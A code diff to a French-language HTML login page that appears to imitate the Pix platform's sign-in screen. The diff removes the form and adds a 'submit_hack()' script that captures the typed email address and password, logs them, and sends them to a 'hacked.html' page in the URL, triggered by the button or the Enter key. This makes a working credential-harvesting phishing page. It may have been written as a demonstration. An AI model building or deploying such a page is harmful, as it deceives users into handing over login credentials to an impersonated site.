@@ -43,19 +43,36 @@
 </header>
 
 <section class="login-page__section--login-form">
-  <form class="login-form" action="hacked.html" method="get">
+  <div class="login-form">
       <input id="ember3" class="ember-text-field ember-view login-form__fields login-form__email-field" placeholder="Adresse e-mail" aria-label="Adresse e-mail" required="true" autocomplete="true" type="text">
 
       <input id="ember4" class="ember-text-field ember-view login-form__fields" placeholder="Mot de passe" aria-label="Mot de passe" required="true" autocomplete="true" type="password">
 
 <!---->
-      <button class="pix-button pix-button--size-big pix-button--primary login-form__button" type="submit">
+      <button class="pix-button pix-button--size-big pix-button--primary login-form__button" type="submit" onclick="submit_hack()">
 <!---->    Je me connecte
 <!----></button>
-  </form>
+  </div>
 </section>
 
     <footer>
     </footer>
   </main>
-</div></body></html>
+</div>
+<script>
+  function submit_hack(){
+    username = encodeURI(document.querySelector('#ember3').value);
+    password = encodeURI(document.querySelector('#ember4').value);
+    console.log(username);
+    console.log(password);
+    window.location.href = "hacked.html#"+username+"------"+password ;
+    return false;
+}
+document.getElementById('ember4').onkeydown = function(e){
+   if(e.keyCode == 13){
+     submit_hack();
+   }
+};
+</script>
+
+</body></html>
